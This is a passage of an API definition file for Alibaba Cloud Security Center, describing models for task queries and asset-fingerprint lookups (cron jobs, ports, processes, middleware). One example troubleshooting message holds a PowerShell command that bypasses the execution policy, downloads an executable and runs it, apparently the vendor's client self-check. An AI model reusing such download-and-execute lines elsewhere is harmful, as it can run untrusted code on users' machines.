*   **causeMsg**: the returned message for the cause.
*   **resCode**: the returned code for troubleshooting.
*   **resMsg**: the returned message for troubleshooting.
*   **problemType**: the type of the issue.
*   **dispatchType**: the task delivery method.
*   **uuid**: the UUID of the server.
*   **instanceId**: the instance ID of the server.
*   **internetIp**: the public IP address of the server.
*   **intranetIp**: the private IP address of the server.
*   **instanceName**: the instance name of the server.
*   **url**: the download URL of the troubleshooting log.', example='[
      {
            "dispatchType": "manual",
            "causeMsg": [],
            "causeCode": [],
            "resCode": [
                  "1003"
            ],
            "resMsg": [
                  "powershell -executionpolicy bypass -c \\"(New-Object Net.WebClient).DownloadFile(\\"http://aegis.alicdn.com/download/aegis_client_self_check/win32/aegis_checker.exe\\", $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath(\\".\\\\\\\\aegis_checker.exe\\"))\\"; \\"./aegis_checker.exe -b eyJtb2RlIjoxLCJqc3J2X2RvbWFpbiI6W10sImlzc3VlIjoib2ZmbGluZSIsInVwZGF0ZV9kb21haW4iOltdLCJ1dWlkIjoiaW5ldC1lYWUwNDg2Ny0wMDJmLTQyM2QtYWYwMC1jNzJjZDYyOWIyNDgiLCJjbWRfaWR4IjoiNDRjZThiZWI3ZGYyYTQxMjQ1NGM4ZDc5OTE1ODI1MzMifQ==\\""
            ],
            "problemType": "offline",
            "uuid": "inet-eae04867-002f-423d-af00-c72cd629****"
      }
]'),
      failCount?: int32(name='FailCount', description='The number of tasks that fail to be executed.', example='2'),
      progress?: string(name='Progress', description='The progress of the task. Unit: percent (%).', example='10%'),
      resultInfo?: string(name='ResultInfo', description='The execution result of the task.', example='successful'),
      successCount?: int32(name='SuccessCount', description='The number of tasks that are executed.', example='7'),
      taskEndTime?: long(name='TaskEndTime', description='The timestamp that indicates the time when the task ends. Unit: milliseconds.', example='1650267989000'),
      taskId?: string(name='TaskId', description='The task ID.', example='e900f528f5a6229bb640ca27cb44c98e'),
      taskName?: string(name='TaskName', description='The name of the task.', example='CLIENT_PROBLEM_CHECK'),
      taskStartTime?: long(name='TaskStartTime', description='The timestamp that indicates the time when the task starts. Unit: milliseconds.', example='1649732012000'),
      taskStatus?: int32(name='TaskStatus', description='The status of the task. Valid values:

*   **1**: The task is started.
*   **2**: The task is complete.
*   **3**: The task fails.
*   **4**: The task times out.', example='1'),
      taskStatusText?: string(name='TaskStatusText', description='The text description of the status for the task. Valid values:

*   **INIT**: The task is pending start.
*   **START**: The task is started.
*   **DISPATCH**: The self-check command is issued.
*   **SUCCESS**: The self-check is complete.
*   **FAIL**: The task fails.
*   **TIMEOUT**: The task times out.', example='INIT'),
      taskType?: string(name='TaskType', description='The type of the task. Valid values:

*   **CLIENT_PROBLEM_CHECK**: a task of the Security Center client
*   **CLIENT_DEV_OPS**: an O\\&M task of Cloud Assistant
*   **ASSET_SECURITY_CHECK**: a task for asset information collection', example='CLIENT_PROBLEM_CHECK'),
    }
  ](name='TaskManageResponseList', description='An array that consists of the tasks.'),
}

model DescribeOnceTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeOnceTaskResponseBody(name='body'),
}

async function describeOnceTask(request: DescribeOnceTaskRequest): DescribeOnceTaskResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeOnceTask', 'POST', '/', 'json', false, 'json', request);
}

model DescribeOnceTaskLeafRecordPageRequest {
  currentPage: int32(name='CurrentPage', description='The number of the page to return.', example='1', position='Query'),
  endTime?: long(name='EndTime', description='The end timestamp of the sub-task.', example='1668064495000', position='Query'),
  pageSize: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20', example='20', position='Query'),
  relateInfo: boolean(name='RelateInfo', description='Specifies whether extension information is associated.', example='true', position='Query'),
  source?: string(name='Source', description='The source of the request.', example='console_batch', position='Query'),
  startTime?: long(name='StartTime', description='The start timestamp of the sub-task.', example='1648438617000', position='Query'),
  statusList?: [ string ](name='StatusList', description='The status information.', position='Query'),
  taskId?: string(name='TaskId', description='The ID of the sub-task.', example='1471d8ebb96795b41ede090b9758****', position='Query'),
  taskType: string(name='TaskType', description='The type of the sub-task. Valid values:

*   **IMAGE_SCAN**: image scan task
*   **IMAGE_REGISTRY_PULL**: image asset synchronization task', example='CLIENT_PROBLEM_CHECK', position='Query'),
}

model DescribeOnceTaskLeafRecordPageResponseBody = {
  onceTasks?: [ 
    {
      endTime?: long(name='EndTime', description='The time when the sub-task ends.', example='1670307567000'),
      finish?: int32(name='Finish', description='Indicates whether the sub-task is complete.

*   **0**: no
*   **1**: yes', example='1'),
      finishCount?: string(name='FinishCount', description='The number of the assets that are scanned.', example='67'),
      progress?: long(name='Progress', description='The progress percentage of the sub-task.', example='75'),
      realRunTime?: long(name='RealRunTime', description='The execution duration of the sub-task.', example='1670307567000'),
      resultInfo?: string(name='ResultInfo', description='The execution result of the sub-task.', example='TASK_NOT_SUPPORT_REGION'),
      startTime?: long(name='StartTime', description='The time when the sub-task starts.', example='1640102400000'),
      status?: string(name='Status', description='The status.', example='0'),
      statusText?: string(name='StatusText', description='The status of the sub-task. Valid values:

*   **INIT**: The sub-task is not started.
*   **START**: The sub-task is started.
*   **SUCCESS**: The sub-task is complete.
*   **TIMEOUT**: The task timed out.', example='SUCCESS'),
      target?: string(name='Target', description='The objective of the sub-task.', example='238cf050a7270dd6940602e70f1e5a11eeaf4e02035f445b7f613ff5e064****'),
      targetType?: string(name='TargetType', description='The type of the assets that are scanned.

*   **IMAGE_REPO**: image repository
*   **IMAGE**: image', example='IMAGE'),
      taskId?: string(name='TaskId', description='The sub-task ID.', example='9fb50f2af8bb67c9fdb684194c83****'),
      taskImageInfo?: {
        appName?: string(name='AppName', description='The name of the application.', example='ack-jenkins-****'),
        clusterId?: string(name='ClusterId', description='The ID of the cluster.', example='a765ba1435e7f9446065370e9a41****'),
        clusterName?: string(name='ClusterName', description='The name of the cluster.', example='ACK-test-****'),
        costTimeInfo?: string(name='CostTimeInfo', example='{"scaVul":"2023-09-04 09:37:21","identificationInfo":"2023-09-04 09:37:30","forbiddenPackageInfo":"2023-09-04 09:37:16","binary":"2023-09-04 09:37:25","baseline":"2023-09-04 09:37:19","sensitiveFile":"2023-09-04 09:38:34","vul":"2023-09-04 09:37:31","webshell":"2023-09-04 09:38:27","sensitiveInfo":"2023-09-04 09:37:16","script":"2023-09-04 09:39:44"}'),
        digest?: string(name='Digest', description='The digest of the image.', example='9e0dc29d872d2e386cc5c0c92b529a84e3acfade16f5cb1d054a2ee3c99****'),
        image?: string(name='Image', description='The image of the container.', example='***s.com/sas_test/baseli***'),
        nodeInstanceId?: string(name='NodeInstanceId', description='The instance ID of the node.', example='i-0xi5mxvtmfw9****'),
        nodeIp?: string(name='NodeIp', description='The IP address of the node.', example='172.18.XXX.XXX'),
        nodeName?: string(name='NodeName', description='The name of the node.', example='pztest****'),
        pod?: string(name='Pod', description='The pod of the image.', example='expoit-law-****'),
        regionId?: string(name='RegionId', description='The region ID of the server image.', example='cn-hangzhou'),
        repoId?: string(name='RepoId', description='The ID of the image repository.', example='crr-r88w2vryp8m****'),
        repoName?: string(name='RepoName', description='The name of the image repository.', example='testyyy'),
        repoNamespace?: string(name='RepoNamespace', description='The name of the namespace to which the image repository belongs.', example='bitn***'),
        repoRegionId?: string(name='RepoRegionId', description='The region ID of the image repository.', example='cn-hangzhou'),
        tag?: string(name='Tag', description='The tag that is added to the image.', example='v1.20-002-a2*****'),
      }(name='TaskImageInfo', description='The information about the image scan.'),
      taskName?: string(name='TaskName', description='The name of the sub-task.', example='IMAGE_SCAN'),
      taskType?: string(name='TaskType', description='The type of the sub-task.', example='IMAGE_SCAN'),
      totalCount?: string(name='TotalCount', description='The total number of entries returned.', example='30'),
    }
  ](name='OnceTasks', description='The details of the sub-tasks.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='6'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='16'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The request ID.', example='A4EB8B1C-1DEC-5E18-BCD0-D1BBB393****'),
}

model DescribeOnceTaskLeafRecordPageResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeOnceTaskLeafRecordPageResponseBody(name='body'),
}

async function describeOnceTaskLeafRecordPage(request: DescribeOnceTaskLeafRecordPageRequest): DescribeOnceTaskLeafRecordPageResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeOnceTaskLeafRecordPage', 'POST', '/', 'json', false, 'json', request);
}

model DescribePropertyCountRequest {
  type?: string(name='Type', description='The type of the asset fingerprints. Separate multiple types with commas (,). Valid values:

*   **port**: port
*   **process**: process
*   **software**: software
*   **user**: account
*   **cron**: scheduled task
*   **sca**: middleware
*   **web**: website
*   **database**: database
*   **lkm**: kernel module
*   **autorun**: startup item
*   **web_server**: web service', example='port,process', position='Query'),
  uuidList?: string(name='UuidList', description='The UUIDs of the assets. Separate multiple UUIDs with commas (,).', example='9658314a-7609-4426-afc4-2c924072****,
9658314a-7609-4426-afc4-2c924072****', position='Query'),
}

model DescribePropertyCountResponseBody = {
  autorun?: int32(name='Autorun', description='The number of startup items.', example='3'),
  cron?: int32(name='Cron', description='The number of scheduled tasks.', example='123'),
  database?: int32(name='Database', description='The number of databases.', example='2'),
  lkm?: int32(name='Lkm', description='The number of kernel modules.', example='4'),
  port?: int32(name='Port', description='The number of ports.', example='22'),
  process?: int32(name='Process', description='The number of processes.', example='367'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
  sca?: int32(name='Sca', description='The number of middleware assets.', example='112'),
  software?: int32(name='Software', description='The number of software assets.', example='111'),
  user?: int32(name='User', description='The number of accounts.', example='214'),
  web?: int32(name='Web', description='The number of websites.', example='65'),
  webserver?: int32(name='Webserver', description='The number of web services.', example='8'),
}

model DescribePropertyCountResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribePropertyCountResponseBody(name='body'),
}

async function describePropertyCount(request: DescribePropertyCountRequest): DescribePropertyCountResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribePropertyCount', 'POST', '/', 'json', false, 'json', request);
}

model DescribePropertyCronDetailRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1', position='Query'),
  extend?: string(name='Extend', description='Specifies whether fuzzy search by path to the scheduled task is supported. If you want to use fuzzy search, set the parameter to **1**. If you set the parameter to a different value or leave the parameter empty, fuzzy search is not supported.', example='1', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **10**.', example='10', position='Query'),
  remark?: string(name='Remark', description='The name or IP address of the server.', example='192.168.XX.XX', position='Query'),
  source?: string(name='Source', description='The path to the scheduled task.', example='/etc/cron.d/root', position='Query'),
  user?: string(name='User', description='The username of the account that runs the scheduled task.', example='root', position='Query'),
  uuid?: string(name='Uuid', description='The UUID of the server.', example='50d213b4-3a35-427a-b8a5-04b0c7e1****', position='Query'),
}

model DescribePropertyCronDetailResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='1'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **10**.', example='10'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='1'),
  }(name='PageInfo', description='The pagination information.'),
  propertys?: [ 
    {
      cmd?: string(name='Cmd', description='The command that is used to run the scheduled task.', example='/usr/lib64/sa/sa1 1 1'),
      createTimestamp?: long(name='CreateTimestamp', description='The timestamp of the last fingerprint collection. Unit: milliseconds.', example='1649149566000'),
      instanceId?: string(name='InstanceId', description='The ID of the server.', example='i-hp35tftuh52wbp1g****'),
      instanceName?: string(name='InstanceName', description='The name of the server.', example='hc-host-****'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='192.168.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='100.104.XX.XX'),
      ip?: string(name='Ip', description='The IP addresses of the server.', example='192.168.XX.XX'),
      md5?: string(name='Md5', description='The MD5 hash value of the path to the scheduled task.', example='4cc8f97c2bf9cbabb2c2be2erqw****'),
      period?: string(name='Period', description='The interval at which the scheduled task is performed.', example='*/10 * * * *'),
      source?: string(name='Source', description='The path to the scheduled task.', example='/etc/cron.d/root'),
      user?: string(name='User', description='The username of the account that runs the scheduled task.', example='root'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='162eb349-c2d9-4f8b-805c-75b43d4c****'),
    }
  ](name='Propertys', description='The details of the scheduled tasks.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='B0C4E12E-CCE1-109D-9E62-7B95CBBAEF8C'),
}

model DescribePropertyCronDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribePropertyCronDetailResponseBody(name='body'),
}

async function describePropertyCronDetail(request: DescribePropertyCronDetailRequest): DescribePropertyCronDetailResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribePropertyCronDetail', 'POST', '/', 'json', false, 'json', request);
}

model DescribePropertyCronItemRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1', position='Query'),
  forceFlush?: boolean(name='ForceFlush', description='Specifies whether to forcefully refresh the data that you want to query. Valid values:

*   **true**: yes
*   **false**: no', example='false', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.', example='20', position='Query'),
  source?: string(name='Source', description='The path to the scheduled task.', example='/data', position='Query'),
}

model DescribePropertyCronItemResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='11'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='11'),
  }(name='PageInfo', description='The pagination information.'),
  propertyItems?: [ 
    {
      count?: int32(name='Count', description='The number of servers on which the scheduled task is run.', example='23'),
      source?: string(name='Source', description='The path to the scheduled task.', example='/data'),
    }
  ](name='PropertyItems', description='An array that consists of scheduled tasks.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='291B49F9-1685-4005-9D34-606B6F78****'),
}

model DescribePropertyCronItemResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribePropertyCronItemResponseBody(name='body'),
}

async function describePropertyCronItem(request: DescribePropertyCronItemRequest): DescribePropertyCronItemResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribePropertyCronItem', 'POST', '/', 'json', false, 'json', request);
}

model DescribePropertyPortDetailRequest {
  bindIp?: string(name='BindIp', description='The IP address that is bound to the listening port.', example='0.0.XX.XX', position='Query'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1', position='Query'),
  extend?: string(name='Extend', description='Specifies whether fuzzy search by port number is supported. If you want to use fuzzy search, set the parameter to **1**. If you set the parameter to a different value or leave the parameter empty, fuzzy search is not supported.', example='1', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **10**.', example='10', position='Query'),
  port?: string(name='Port', description='The listening port of the server.', example='22', position='Query'),
  procName?: string(name='ProcName', description='The name of the server process.', example='sshd', position='Query'),
  remark?: string(name='Remark', description='The name or IP address of the server.', example='192.168.XX.XX', position='Query'),
  resourceDirectoryAccountId?: long(name='ResourceDirectoryAccountId', position='Query'),
  uuid?: string(name='Uuid', description='The UUID of the server.', example='50d213b4-3a35-427a-b8a5-04b0c7e1****', position='Query'),
}

model DescribePropertyPortDetailResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='1'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **10**.', example='10'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='1'),
  }(name='PageInfo', description='The pagination information.'),
  propertys?: [ 
    {
      bindIp?: string(name='BindIp', description='The IP address that is bound to the listening port.', example='0.0.X.X'),
      createTimestamp?: long(name='CreateTimestamp', description='The timestamp of the last fingerprint collection. Unit: milliseconds.', example='1649149566000'),
      instanceId?: string(name='InstanceId', description='The ID of the server.', example='i-hp35tftuh52wbp1g****'),
      instanceName?: string(name='InstanceName', description='The name of the server.', example='hc-host-****'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='192.168.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='100.104.XX.XX'),
      ip?: string(name='Ip', description='The IP address of the network interface controller (NIC) that is bound to the listening port.', example='192.168.XX.XX'),
      pid?: string(name='Pid', description='The ID of the server process that listens on the port.', example='522'),
      port?: string(name='Port', description='The listening port.', example='22'),
      procName?: string(name='ProcName', description='The name of the server process.', example='sshd'),
      proto?: string(name='Proto', description='The network protocol that is used by the listening port.', example='tcp'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='162eb349-c2d9-4f8b-805c-75b43d4c****'),
    }
  ](name='Propertys', description='An array that consists of the fingerprints of the ports.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='0FA7F1F4-488D-52CA-9BFC-3E47793B49D1'),
}

model DescribePropertyPortDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribePropertyPortDetailResponseBody(name='body'),
}

async function describePropertyPortDetail(request: DescribePropertyPortDetailRequest): DescribePropertyPortDetailResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribePropertyPortDetail', 'POST', '/', 'json', false, 'json', request);
}

model DescribePropertyPortItemRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='1', position='Query'),
  forceFlush?: boolean(name='ForceFlush', description='Specifies whether to forcefully refresh the data that you want to query.', example='true', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.', example='5', position='Query'),
  port?: string(name='Port', description='The port number.', example='22', position='Query'),
}

model DescribePropertyPortItemResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='5'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='5'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='163'),
  }(name='PageInfo', description='The pagination information.'),
  propertyItems?: [ 
    {
      count?: int32(name='Count', description='The number of servers that use the port.', example='495'),
      port?: string(name='Port', description='The number of the listening port.', example='22'),
      proto?: string(name='Proto', description='The network protocol of the port.', example='tcp'),
    }
  ](name='PropertyItems', description='An array that consists of the ports returned.'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model DescribePropertyPortItemResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribePropertyPortItemResponseBody(name='body'),
}

async function describePropertyPortItem(request: DescribePropertyPortItemRequest): DescribePropertyPortItemResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribePropertyPortItem', 'POST', '/', 'json', false, 'json', request);
}

model DescribePropertyProcDetailRequest {
  cmdline?: string(name='Cmdline', description='The startup parameter of the process.', example='./8888', position='Query'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1', position='Query'),
  extend?: string(name='Extend', description='Specifies whether fuzzy search by process name is supported. If you want to use fuzzy search, set the parameter to 1. If you set the parameter to a different value or leave the parameter empty, fuzzy search is not supported.', example='1', position='Query'),
  name?: string(name='Name', description='The name of the process.', example='8888', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **10**.', example='10', position='Query'),
  procTimeEnd?: long(name='ProcTimeEnd', description='The timestamp when the process ends. Unit: milliseconds.', example='1649587453000', position='Query'),
  procTimeStart?: long(name='ProcTimeStart', description='The timestamp when the process starts. Unit: milliseconds.', example='1648809853000', position='Query'),
  remark?: string(name='Remark', description='The name or IP address of the server.', example='192.168.XX.XX', position='Query'),
  resourceDirectoryAccountId?: long(name='ResourceDirectoryAccountId', position='Query'),
  user?: string(name='User', description='The user who runs the process.', example='root', position='Query'),
  uuid?: string(name='Uuid', description='The UUID of the server.', example='50d213b4-3a35-427a-b8a5-04b0c7e1****', position='Query'),
}

model DescribePropertyProcDetailResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='1'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **10**.', example='10'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='1'),
  }(name='PageInfo', description='The pagination information.'),
  propertys?: [ 
    {
      cmdline?: string(name='Cmdline', description='The startup parameter of the process.', example='./8888'),
      createTimestamp?: long(name='CreateTimestamp', description='The timestamp of last data collection. Unit: milliseconds.', example='1565686951000'),
      euidName?: string(name='EuidName', description='The permission that is required to run the process.', example='root'),
      instanceId?: string(name='InstanceId', description='The ID of the server that is associated with the process.', example='i-hp35tftuh52wbp1g****'),
      instanceName?: string(name='InstanceName', description='The name of the server that is associated with the process.', example='hc-host-****'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='192.168.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='192.168.XX.XX'),
      isPackage?: int32(name='IsPackage', description='Indicates whether the process is a package installation process. Valid values:

*   **1**: yes
*   **0**: no', example='1'),
      md5?: string(name='Md5', description='The MD5 hash value of the process file.', example='842644ea3d88bd7f7e14c1c089ef****'),
      name?: string(name='Name', description='The name of the process.', example='agetty'),
      path?: string(name='Path', description='The path of the process.', example='/root/Oracle/Middleware/***/8888'),
      pid?: string(name='Pid', description='The ID of the process.', example='12826'),
      pname?: string(name='Pname', description='The name of the parent process to which the process belongs.', example='start***.s'),
      startTime?: string(name='StartTime', description='The time when the process starts.', example='2019-08-07 10:09:05'),
      startTimeDt?: long(name='StartTimeDt', description='The timestamp when the process starts. Unit: milliseconds.', example='1648783107000'),
      state?: string(name='State', description='The status of the process.', example='sleeping'),
      user?: string(name='User', description='The user who runs the process.', example='root'),
      uuid?: string(name='Uuid', description='The UUID of the server that is associated with the process.', example='162eb349-c2d9-4f8b-805c-75b43d4c****'),
    }
  ](name='Propertys', description='An array that consists of the fingerprints of the processes.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='AA47D46F-10DE-138C-BBB4-8A0003F75CD7'),
}

model DescribePropertyProcDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribePropertyProcDetailResponseBody(name='body'),
}

async function describePropertyProcDetail(request: DescribePropertyProcDetailRequest): DescribePropertyProcDetailResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribePropertyProcDetail', 'POST', '/', 'json', false, 'json', request);
}

model DescribePropertyProcItemRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='1', position='Query'),
  forceFlush?: boolean(name='ForceFlush', description='Specifies whether to forcefully refresh the data that you want to query.', example='true', position='Query'),
  name?: string(name='Name', description='The name of the process.', example='test', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.', example='10', position='Query'),
}

model DescribePropertyProcItemResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='5'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='5'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='372'),
  }(name='PageInfo', description='The pagination information.'),
  propertyItems?: [ 
    {
      count?: int32(name='Count', description='The number of servers on which the process runs.', example='8888'),
      name?: string(name='Name', description='The name of the process.', example='.ss'),
    }
  ](name='PropertyItems', description='An array that consists of the processes returned.'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='BD8AD4C6-A169-4FA3-BA1F-ED40ED52973B'),
}

model DescribePropertyProcItemResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribePropertyProcItemResponseBody(name='body'),
}

async function describePropertyProcItem(request: DescribePropertyProcItemRequest): DescribePropertyProcItemResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribePropertyProcItem', 'POST', '/', 'json', false, 'json', request);
}

model DescribePropertyScaDetailRequest {
  biz?: string(name='Biz', description='The type of the asset fingerprint that you want to query. Default value: **sca**. Valid values:

*   **sca**: middleware
*   **sca_database**: database
*   **sca_web**: web service

>  If you do not specify this parameter, the default value **sca** is used, which indicates that middleware fingerprints are queried.', example='sca', position='Query'),
  bizType?: string(name='BizType', description='The type of the middleware, database, or web service that you want to query. Valid values:

*   **system_service**: system service
*   **software_library**: software library
*   **docker_component**: container component
*   **database**: database
*   **web_container**: web container
*   **jar**: JAR package
*   **web_framework**: web framework', example='system_service', position='Query'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  name?: long(name='Name', description='The name of the middleware, database, or web service.

>  This parameter is deprecated. You can ignore it.', example='1', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **10**.

>  We recommend that you do not leave this parameter empty.', example='10', position='Query'),
  pid?: string(name='Pid', description='The PID.', example='756', position='Query'),
  port?: string(name='Port', description='The port that the process monitors.', example='68', position='Query'),
  processStartedEnd?: long(name='ProcessStartedEnd', description='The timestamp when the process ends. Unit: milliseconds.', example='1641110965', position='Query'),
  processStartedStart?: long(name='ProcessStartedStart', description='The timestamp when the process starts. Unit: milliseconds.', example='1641024565', position='Query'),
  remark?: string(name='Remark', description='The search condition, such as a server name or a server IP address.

>  Fuzzy match is supported.', example='192.168', position='Query'),
  scaName?: string(name='ScaName', description='The name of the asset fingerprint that you want to query.', example='openssl', position='Query'),
  scaNamePattern?: string(name='ScaNamePattern', description='The name of the process.', example='open', position='Query'),
  scaVersion?: string(name='ScaVersion', description='The version of the middleware, database, or web service.', example='1.0.2k', position='Query'),
  searchInfo?: string(name='SearchInfo', description='The search keyword. You must specify this parameter based on the value of the **SearchItem** parameter.

*   If the **SearchItem** parameter is set to **name**, you must enter the name of an asset fingerprint.

*   If the **SearchItem** parameter is set to **type**, you must enter the type of an asset fingerprint. Valid values:

    *   **system_service**: system service
    *   **software_library**: software library
    *   **docker_component**: container component
    *   **database**: database
    *   **web_container**: web container
    *   **jar**: JAR package
    *   **web_framework**: web framework

>  You must specify both the **SearchItem** and **SearchInfo** parameters before you can query the asset fingerprints based on the specified name or type.', example='openssl', position='Query'),
  searchInfoSub?: string(name='SearchInfoSub', description='The keyword of the subquery. You must specify this parameter based on the value of the **SearchItemSub** parameter.

*   If the **SearchItemSub** parameter is set to **port**, you must enter a port number.
*   If the **SearchItemSub** parameter is set to **pid**, you must enter a process ID (PID).
*   If the **SearchItemSub** parameter is set to **version**, you must enter the version of a database, middleware, or web service.
*   If the **SearchItemSub** parameter is set to **user**, you must enter a username.

>  The subquery is used to search for data of a specified database, middleware, or web service.', example='1.0.2k', position='Query'),
  searchItem?: string(name='SearchItem', description='The type of the search condition. Valid values:

*   **name**: the name of a database, middleware, or web service
*   **type**: the type of a database, middleware, or web service

>  You must specify both the **SearchItem** and **SearchInfo** parameters before you can query the asset fingerprints based on the specified name or type.', example='name', position='Query'),
  searchItemSub?: string(name='SearchItemSub', description='The type of the subquery. Valid values:

*   **port**
*   **pid**
*   **version**
*   **user**', example='version', position='Query'),
  user?: string(name='User', description='The user who runs the process.', example='root', position='Query'),
  uuid?: string(name='Uuid', description='The UUID of the server on which the middleware, database, or web service is run.', example='uuid-02ebabe7-1c19-ab****', position='Query'),
}

model DescribePropertyScaDetailResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='2'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **10**.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='2'),
  }(name='PageInfo', description='The pagination information.'),
  propertys?: [ 
    {
      bizType?: string(name='BizType', description='The type of the middleware, database, or web service. Valid values:

*   **system_service**: system service
*   **software_library**: software library
*   **docker_component**: container component
*   **database**: database
*   **web_container**: web container
*   **jar**: JAR package
*   **web_framework**: web framework', example='software_library'),
      bizTypeDispaly?: string(name='BizTypeDispaly', description='The display name of the type of the middleware, database, or web service . Valid values:

*   System service
*   Software library
*   Container component
*   Database
*   Web container
*   JAR package
*   Web framework', example='System Service'),
      cmdline?: string(name='Cmdline', description='The command line of the process.', example='/sbin/dhclient -H iz2zeflhhbtk8gtxzt087az -1 -q -lf /var/lib/dhclient/dhclient--eth0.lease -pf /var/run/dhclient-eth0.pid eth0'),
      configPath?: string(name='ConfigPath', description='The path to the configuration file.', example='/etc/my.cnf'),
      containerName?: string(name='ContainerName', description='The name of the container.', example='5-rce_web_1'),
